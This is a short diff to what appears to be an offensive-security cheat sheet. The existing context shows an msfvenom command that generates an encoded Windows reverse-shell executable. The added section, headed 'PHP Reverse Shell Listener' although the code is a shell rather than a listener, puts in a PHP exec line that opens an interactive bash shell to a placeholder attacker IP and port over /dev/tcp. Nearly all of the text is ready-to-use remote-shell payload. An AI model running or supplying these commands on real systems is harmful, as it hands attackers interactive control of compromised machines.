@@ -48,3 +48,8 @@ Another way to generate a reverse shell as an Windows executable:
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -e x86/shikata_ga_nai -f exe-service -o [FILE]
 ```
+********************************************************************************
+## PHP Reverse Shell Listener
+```
+exec("/bin/bash -c 'bash -i >& /dev/tcp/[ATTACK-IP]/[PORT] 0>&1'")
+```
